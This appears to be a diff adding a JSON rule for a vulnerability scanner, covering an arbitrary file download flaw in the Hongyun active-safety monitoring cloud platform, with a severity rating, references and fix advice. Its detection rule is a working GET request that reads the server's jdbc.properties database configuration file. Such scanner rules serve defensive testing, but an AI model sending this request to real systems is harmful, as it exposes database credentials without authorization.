@@ -1,0 +1,24 @@
+{
+    "vul_name": "鸿运主动安全监控云平台 任意文件下载漏洞",
+    "level": "中危",
+    "description": "808gps/MobileAction_downLoad.action接口可下载任意文件，获取系统敏感文件信息。",
+    "product": "鸿运主动安全监控云平台",
+    "version": "无",
+    "cve": "无",
+    "reference": "https://mp.weixin.qq.com/s/z-_tvCQmg353deuQH9srWQ",
+    "fixing": "https://mp.weixin.qq.com/s/fVUFOX-Vo9hOsC5NdXAZJw\n1、对下载路径进行过滤，如下载前对传入的参数进行过滤，并且对下载文件类型进行检查，是否是允许下载的类型，另外禁止使用回溯符../！",
+    "rule": {
+        "path": "808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties",
+        "method": "GET",
+        "headers": "Upgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: language=zh; style=1; maintitle=%u5317%u6597%u89C6%u9891%u8FD0%u8425%u5E73%u53F0; JSESSIONID=1B2F4E6550CE07CBA9EBE5533B00AE05\nConnection: close",
+        "body": "",
+        "status_code": "200",
+        "keywords": "jdbc",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
